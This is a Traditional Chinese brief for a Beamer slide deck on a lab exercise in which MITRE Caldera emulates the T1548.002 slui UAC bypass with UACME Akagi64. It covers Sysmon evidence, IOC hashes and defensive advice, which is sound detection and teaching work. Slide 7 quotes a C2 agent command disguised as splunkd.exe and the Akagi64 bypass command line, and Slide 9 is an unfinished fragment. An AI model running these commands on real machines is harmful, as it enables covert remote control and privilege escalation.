# 簡報製作指示：MITRE Caldera ATT&CK 攻擊模擬

請使用 LaTeX Beamer 製作繁體中文簡報，主題使用 `metropolis` 或 `Madrid`，配色專業深色系。

---

## 簡報基本資訊

- 標題：MITRE Caldera 攻擊模擬與日誌分析
- 副標題：T1548.002 - Slui File Handler Hijack
- 作者：趙子佾
- 日期：2026年4月

---

## 投影片結構

### Slide 1：封面
- 標題、副標題、作者、日期

---

### Slide 2：實驗環境架構

內容：兩台機器

| 角色 | 系統 | 說明 |
|------|------|------|
| Caldera Server | Linux | 攻擊控制中心，執行 C2 Server |
| Windows Agent | Windows 10/11 | 目標端點，部署 Sandcat Agent |

網路：兩台機器在同一網段，Server IP：10.1.106.114, windows agent: 10.1.106.161

---

### Slide 3：MITRE Caldera 介紹

- MITRE ATT&CK 框架自動化攻擊模擬平台
- 架構分為兩個部分：
  - **Server**：C2 伺服器，提供 Web UI 和 REST API，負責下發指令
  - **Agent（Sandcat）**：部署在目標機器，接收並執行攻擊指令
- 支援 ATT&CK TTP 自動化執行

---

### Slide 4：攻擊技術說明 T1548.002

- **技術名稱**：Abuse Elevation Control Mechanism - Bypass User Account Control
- **子技術**：Slui File Handler Hijack
- **原理**：
  - 利用 slui.exe 的 File Handler 機制
  - 不需要使用者互動即可繞過 UAC 彈窗
  - 從 Medium Integrity 提升至 High Integrity
- **工具**：UACME（Akagi64.exe）Method 45

---

### Slide 5：攻擊執行流程

使用 tikz 或 block 圖表示以下流程：

```
Caldera Server
    ↓ 下發指令 + 傳送 Akagi64.exe
Sandcat Agent（splunkd.exe）
    ↓ 執行
PowerShell.exe（Medium Integrity）
    ↓ 執行
Akagi64.exe（Medium Integrity）
    ↓ UAC Bypass
slui.exe（High Integrity）
    ↓ 建立
cmd.exe（High Integrity）← 攻擊成功
```

---

### Slide 6：Sysmon 日誌分析 - 攻擊鏈

從 Sysmon Event ID 1（Process Create）還原完整攻擊鏈：

| 時間 | Process | IntegrityLevel | Parent |
|------|---------|---------------|--------|
| 12:27:53 | powershell.exe | Medium | splunkd.exe |
| 12:27:54 | Akagi64.exe | Medium | powershell.exe |
| 12:27:54 | slui.exe | **High** | Akagi64.exe |
| 12:27:54 | slui.exe 0x03 | **High** | slui.exe |
| 12:27:54 | cmd.exe | **High** | slui.exe |
| 12:27:59 | Akagi64.exe | - | 終止（Event ID 5） |

重點：IntegrityLevel 從 **Medium → High** 代表 UAC Bypass 成功

---

### Slide 7：Sysmon 關鍵證據

**攻擊來源（Agent 偽裝）：**
```
Image: C:\Users\Public\splunkd.exe
CommandLine: splunkd.exe -server http://10.1.106.114:8888 -group red
```

**UAC Bypass 執行：**
```
Image: C:\Users\Public\Akagi64.exe
CommandLine: Akagi64.exe 45 C:\Windows\System32\cmd.exe
IntegrityLevel: Medium → High
```

**最終結果：**
```
Image: C:\Windows\System32\cmd.exe
IntegrityLevel: High
ParentImage: C:\Windows\System32\slui.exe
```

---

### Slide 8：Hash 與 IOC

可作為威脅情報指標（IOC）：

| 檔案 | MD5 | SHA256（前32字元） |
|------|-----|---------|
| Akagi64.exe | CA3FE69BFDBD536856BF36BBB8C949D4 | 9556E16A8D2B003DA04EC9A8973E038D... |
| cmd.exe | 77F0062F490BCC7023763A422E561945 | 14CC8AB1DCF0D9F19E8FB82DEB547CF8... |
| slui.exe | CF0A69B5DA75D171E5BFAE9CEC695F8C | BAE2B3360B3493027FA43B6E942D3C37... |

---

### Slide 9：Procmon 輔助分析

eri

---

### Slide 10：防禦建議

| 防禦措施 | 說明 |
|---------|------|
| 啟用 Sysmon | 記錄 Process 建立、Registry 修改等事件 |
| 監控 IntegrityLevel 變化 | Medium → High 為異常提權跡象 |
| 限制 slui.exe 執行權限 | 避免被用於 UAC Bypass |
| 開啟 Tamper Protection | 防止攻擊者關閉 Defender |
| 監控異常 Process 父子關係 | splunkd.exe 不應該建立 powershell.exe |

---

### Slide 11：結論

- 成功使用 MITRE Caldera 模擬 T1548.002 攻擊
- Sysmon 完整記錄從 Agent 到 UAC Bypass 的完整攻擊鏈
- 攻擊者使用 splunkd.exe 偽裝成合法程式，並透過 Akagi64.exe 繞過 UAC
- IntegrityLevel 從 Medium 提升至 High 是關鍵偵測指標

---

## LaTeX 製作注意事項

1. 使用 `xelatex` 編譯以支援繁體中文
2. 加入 `\usepackage{ctex}` 或 `\usepackage{xeCJK}`
3. 字型建議使用 `\setCJKmainfont{Noto Serif CJK TC}` 或 `Microsoft JhengHei`
4. 攻擊流程圖使用 `tikz` 套件繪製箭頭流程圖
5. 程式碼區塊使用 `minted` 或 `listings` 套件
6. 表格使用 `booktabs` 套件美化
7. Beamer theme 建議：`metropolis`（需另外安裝）或內建的 `Madrid`、`Berlin`
